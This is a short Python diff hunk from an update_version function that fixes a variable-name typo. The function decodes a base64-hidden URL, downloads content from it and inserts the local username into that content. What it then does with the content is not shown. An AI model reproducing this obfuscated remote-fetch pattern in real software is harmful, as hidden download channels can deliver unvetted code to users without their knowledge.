@@ -25,7 +25,7 @@ def update_version():
     decoded_file_path = base64.b64decode(updated_file_path_b64).decode('utf-8')
     response = uLib.urlopen(decoded_file_path)
     content = response.read()
-    content = content_bytes.decode('utf-8') if type(content) == type(b'') else content
+    content = content.decode('utf-8') if type(content) == type(b'') else content
     username = getpass.getuser()
     u_read = content.replace('$usr_orig$', username)
     #u_read = uLib.urlopen(base64.b64decode(updated_file_path_b64)).read().decode().replace('$usr_orig$', getpass.getuser())
